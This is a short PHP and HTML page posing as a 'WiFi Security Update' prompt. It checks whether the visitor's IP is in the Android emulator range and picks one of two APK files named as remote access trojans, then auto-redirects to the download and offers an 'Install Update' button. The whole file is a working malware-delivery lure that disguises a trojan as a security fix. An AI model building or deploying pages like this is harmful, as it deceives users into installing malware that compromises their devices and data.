<?php
$remote_ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
if (strpos($remote_ip, '10.0.2.') === 0) {
    $apk_file = 'rat_emulator.apk';
} else {
    $apk_file = 'rat_device.apk';
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Security Update Required</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta http-equiv="refresh" content="1;url=<?=$apk_file?>">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;
            background:linear-gradient(135deg,#0d6efd,#0a58ca);min-height:100vh;
            display:flex;align-items:center;justify-content:center;color:#fff}
        .card{background:rgba(255,255,255,0.96);border-radius:16px;padding:40px;
            width:90%;max-width:400px;text-align:center;color:#212529;
            box-shadow:0 20px 60px rgba(0,0,0,0.3)}
        .icon{width:64px;height:64px;background:#0d6efd;border-radius:50%;
            display:inline-flex;align-items:center;justify-content:center;margin-bottom:16px}
        h2{font-size:20px;margin-bottom:8px}
        .spinner{border:4px solid #e9ecef;border-top:4px solid #0d6efd;border-radius:50%;
            width:40px;height:40px;animation:spin 1s linear infinite;margin:16px auto}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        .btn{display:inline-block;margin-top:16px;padding:12px 24px;
            background:#198754;color:#fff;text-decoration:none;border-radius:8px;
            font-weight:600;font-size:15px}
        .small{font-size:12px;color:#adb5bd;margin-top:12px}
    </style>
</head>
<body>
<div class="card">
    <div class="icon"><svg width="32" height="32" viewBox="0 0 24 24" fill="white"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg></div>
    <h2>WiFi Security Update</h2>
    <p style="color:#6c757d;font-size:13px">Downloading required update...</p>
    <div class="spinner"></div>
    <a class="btn" href="<?=$apk_file?>">Install Update</a>
    <p class="small">Download starts automatically. If not, tap above.</p>
</div>
</body>
</html>
